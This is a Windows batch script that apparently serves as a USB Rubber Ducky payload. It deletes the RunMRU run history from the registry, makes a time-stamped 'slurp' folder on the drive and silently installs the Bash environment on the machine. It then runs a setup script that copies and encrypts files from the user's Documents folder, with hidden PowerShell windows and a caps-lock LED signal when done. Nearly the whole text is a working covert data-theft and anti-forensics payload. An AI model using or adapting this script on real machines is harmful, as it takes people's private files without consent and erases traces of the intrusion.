REM Delete registry keys for "run" history, note "/f" is required
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

REM Create directory with time date stamp of user files onto ducky drive
REM Note the "%~d0" is the dirive leter of this script but only works in batch scripts
set dst=%~d0\slurp\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~-7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
mkdir %dst% >>nul
REM Set variable for where Paranoid_Pipes.sh setup script can be found
set inst=%~d0\b.bash
REM Set variable for target directory to search for pdf files to copy from
set tgt=%USERPROFILE%\Documents
set ppn=%dst%\encrypter.pipe

REM If directory exsists slurp interesting documents or directories
if Exsist %tgt% (
REM Based off instructions found at: http://www.howtogeek.com/249966/how-to-install-and-use-the-linux-bash-shell-on-windows-10/
REM And instructions from: http://www.howtogeek.com/261591/how-to-create-and-run-bash-shell-scripts-on-windows-10/
REM And instructions from: http://www.howtogeek.com/261449/how-to-install-linux-software-in-windows-10s-ubuntu-bash-shell/
REM And instructions from: http://superuser.com/questions/198525/how-can-i-execute-a-windows-command-line-in-background

REM Install Bash (Ubuntu) enviroment on Windows 10 64bit and project scripts with target and destination assigned
START "" /B lxrun /install /y && START "" /B bash -c "sudo apt-get update -qqq && sudo apt-get install -yqqq gnupg git && ./%inst% \"%tgt%\" \"%dst%\" \"%ppn%\"" 1>bash_install.log 2>1&

REM Setup watcher for when pipe file is auto removed
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "while (Test-Path -Path '%ppn%'){Start-Sleep -Milliseconds 100}"
)

REM Blink capslock LED to signify finished with last set of operations
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;"

@cls
@exit
